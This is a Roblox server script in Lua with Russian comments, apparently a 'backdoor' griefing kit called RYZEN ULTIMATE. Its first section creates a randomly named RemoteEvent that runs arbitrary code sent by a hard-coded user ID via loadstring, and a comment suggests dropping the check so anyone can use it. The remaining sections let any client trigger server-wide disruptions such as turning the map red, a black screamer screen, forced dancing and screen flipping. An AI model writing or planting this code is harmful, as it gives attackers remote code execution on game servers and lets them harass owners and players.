-- ============================================================
-- RYZEN ULTIMATE – СЕРВЕРНАЯ ВЕРСИЯ (РАБОТАЕТ У ВСЕХ)
-- ============================================================

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Создаём RemoteEvent для связи с клиентами
local remote = Instance.new("RemoteEvent")
remote.Name = "RyzenRemote"
remote.Parent = ReplicatedStorage

-- ============================================================
-- 1. БЭКДОР – ВЫПОЛНЕНИЕ ЛЮБОГО КОДА НА СЕРВЕРЕ
-- ============================================================

-- Скрытый RemoteEvent для бэкдора
local backdoorRemote = Instance.new("RemoteEvent")
backdoorRemote.Name = "Backdoor_" .. HttpService:GenerateGUID(false):sub(1, 8)
backdoorRemote.Parent = ReplicatedStorage

backdoorRemote.OnServerEvent:Connect(function(player, command, ...)
    -- Проверка: только создатель скрипта может использовать бэкдор
    -- (можно убрать проверку, чтобы все могли)
    if player.UserId ~= 123456789 then -- ЗАМЕНИТЕ НА СВОЙ USER ID!
        return
    end
    
    local args = {...}
    local code = args[1]
    
    if command == "exec" and code then
        local func, err = loadstring(code)
        if func then
            local success, result = pcall(func)
            if success then
                print("[БЭКДОР] Выполнено: " .. code)
                return result
            else
                warn("[БЭКДОР] Ошибка: " .. tostring(result))
            end
        else
            warn("[БЭКДОР] Ошибка загрузки: " .. tostring(err))
        end
    end
end)

-- ============================================================
-- 2. ГЛОБАЛЬНЫЕ ЭФФЕКТЫ (ВИДНЫ ВСЕМ)
-- ============================================================

local function notifyAll(title, text)
    remote:FireAllClients("Notify", title, text)
end

-- 2.1 ВСЁ КРАСНОЕ
local function makeEverythingRed()
    pcall(function()
        -- Небо
        local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
        sky.SkyboxBk = "rbxassetid://15050311563"
        sky.SkyboxDn = "rbxassetid://15050311563"
        sky.SkyboxLf = "rbxassetid://15050311563"
        sky.SkyboxRt = "rbxassetid://15050311563"
        sky.SkyboxUp = "rbxassetid://15050311563"
        Lighting.FogColor = Color3.fromRGB(200, 0, 0)
        Lighting.FogEnd = 1000
        Lighting.Brightness = 2
        Lighting.Ambient = Color3.fromRGB(100, 0, 0)
        Lighting.OutdoorAmbient = Color3.fromRGB(100, 0, 0)
        Lighting.ClockTime = 0.1
    end)
    
    pcall(function()
        local atmos = Workspace:FindFirstChild("RyzenAtmos")
        if not atmos then
            atmos = Instance.new("Atmosphere")
            atmos.Name = "RyzenAtmos"
            atmos.Parent = Workspace
        end
        atmos.Color = Color3.fromRGB(200, 0, 0)
        atmos.Decay = Color3.fromRGB(100, 0, 0)
        atmos.Density = 0.5
        atmos.Offset = 0.5
    end)
    
    pcall(function()
        local bloom = Lighting:FindFirstChild("RyzenBloom")
        if not bloom then
            bloom = Instance.new("BloomEffect")
            bloom.Name = "RyzenBloom"
            bloom.Parent = Lighting
        end
        bloom.Intensity = 1.5
        bloom.Size = 100
        bloom.Threshold = 0.3
    end)
    
    pcall(function()
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("Terrain") then
                v:SetMaterialColor(Enum.Material.Grass, Color3.fromRGB(200, 0, 0))
                v:SetMaterialColor(Enum.Material.Sand, Color3.fromRGB(150, 0, 0))
                v:SetMaterialColor(Enum.Material.Ground, Color3.fromRGB(100, 0, 0))
                v:SetMaterialColor(Enum.Material.Rock, Color3.fromRGB(50, 0, 0))
                v.WaterColor = Color3.fromRGB(200, 0, 0)
                v.WaterReflectance = 0.5
                v.WaterTransparency = 0.4
            end
        end
    end)
    
    pcall(function()
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and not v:IsDescendantOf(Players) then
                v.Color = Color3.fromRGB(200, 0, 0)
                if math.random(1, 3) == 1 then
                    v.Material = Enum.Material.Neon
                end
            end
        end
    end)
    
    notifyAll("🔥", "ВСЁ СТАЛО КРАСНЫМ!")
end

-- 2.2 СКРИМЕР (ЧЁРНЫЙ ЭКРАН У ВСЕХ)
local function showScreamerAll()
    remote:FireAllClients("Screamer", true)
    notifyAll("😱", "СКРИМЕР АКТИВИРОВАН!")
end

local function hideScreamerAll()
    remote:FireAllClients("Screamer", false)
    notifyAll("✅", "Скример убран!")
end

-- 2.3 ТАНЕЦ (ВСЕ ИГРОКИ ТАНЦУЮТ)
local function danceAll()
    for _, player in pairs(Players:GetPlayers()) do
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            local humanoid = char.Humanoid
            local anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://148840371"
            local track = humanoid:LoadAnimation(anim)
            track:Play()
            track.Looped = true
        end
    end
    notifyAll("💃", "ВСЕ ТАНЦУЮТ!")
end

local function stopDanceAll()
    for _, player in pairs(Players:GetPlayers()) do
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            local humanoid = char.Humanoid
            for _, anim in pairs(humanoid:GetPlayingAnimationTracks()) do
                anim:Stop()
            end
        end
    end
    notifyAll("⏹️", "Танцы остановлены!")
end

-- 2.4 ТРЯСКА КАМЕРЫ (У ВСЕХ)
local function shakeAll()
    remote:FireAllClients("Shake")
    notifyAll("📷", "ТРЯСКА У ВСЕХ!")
end

-- 2.5 ПЕРЕВОРОТ ЭКРАНА (У ВСЕХ)
local function flipAll()
    remote:FireAllClients("Flip")
    notifyAll("🔄", "ПЕРЕВОРОТ У ВСЕХ!")
end

-- 2.6 ВОССТАНОВЛЕНИЕ
local function restoreAll()
    pcall(function()
        Lighting.FogColor = Color3.fromRGB(255, 255, 255)
        Lighting.Brightness = 1
        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
        Lighting.ClockTime = 12
        
        local sky = Lighting:FindFirstChild("Sky")
        if sky then
            sky.SkyboxBk = ""
            sky.SkyboxDn = ""
            sky.SkyboxLf = ""
            sky.SkyboxRt = ""
            sky.SkyboxUp = ""
        end
        
        local atmos = Workspace:FindFirstChild("RyzenAtmos")
        if atmos then atmos:Destroy() end
        
        local bloom = Lighting:FindFirstChild("RyzenBloom")
        if bloom then bloom:Destroy() end
        
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("Terrain") then
                v:SetMaterialColor(Enum.Material.Grass, Color3.fromRGB(0, 255, 0))
                v:SetMaterialColor(Enum.Material.Sand, Color3.fromRGB(255, 255, 0))
                v:SetMaterialColor(Enum.Material.Ground, Color3.fromRGB(139, 69, 19))
                v.WaterColor = Color3.fromRGB(0, 0, 255)
            end
            if v:IsA("BasePart") and not v:IsDescendantOf(Players) then
                v.Color = Color3.fromRGB(255, 255, 255)
                v.Material = Enum.Material.SmoothPlastic
            end
        end
    end)
    
    remote:FireAllClients("Restore")
    notifyAll("🔄", "ВСЁ ВОССТАНОВЛЕНО!")
end

-- ============================================================
-- 3. ОБРАБОТЧИК КОМАНД ОТ КЛИЕНТОВ
-- ============================================================

remote.OnServerEvent:Connect(function(player, command, ...)
    if command == "Red" then
        makeEverythingRed()
    elseif command == "ScreamerOn" then
        showScreamerAll()
    elseif command == "ScreamerOff" then
        hideScreamerAll()
    elseif command == "Dance" then
        danceAll()
    elseif command == "StopDance" then
        stopDanceAll()
    elseif command == "Shake" then
        shakeAll()
    elseif command == "Flip" then
        flipAll()
    elseif command == "Restore" then
        restoreAll()
    end
end)

print("✅ RYZEN ULTIMATE – СЕРВЕР ЗАПУЩЕН! ВСЕ ЭФФЕКТЫ РАБОТАЮТ У ВСЕХ!")
